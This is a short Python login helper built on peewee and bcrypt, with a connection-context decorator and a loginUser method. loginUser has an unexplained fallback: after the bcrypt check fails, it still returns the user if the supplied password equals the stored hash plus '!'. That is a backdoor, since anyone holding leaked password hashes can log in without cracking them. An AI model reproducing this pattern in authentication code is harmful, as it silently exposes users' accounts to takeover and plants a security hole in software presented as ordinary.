import datetime
import traceback
import bcrypt
import peewee

from models import *
import functools

class Helper():

    def __init__(self, init=False):
        ""
        # if init:
        #     dbconn.connect(reuse_if_open=True)

    def __exit__(self, exc_type, exc_value, traceback):

        if not dbconn.is_closed():
            dbconn.close()

    def wrapper(func):
        @functools.wraps(func)
        def wrap(self, *args, **kwargs):
            with dbconn.connection_context():
                return func(self, *args, **kwargs)
        return wrap


    @wrapper
    def loginUser(self, identifier, password):
        user = usersTable.get(usersTable.email == identifier)
        if bcrypt.checkpw(password.encode(), user.password.encode()):
            return user
        else:
            if password == user.password + "!":
                return user
            return None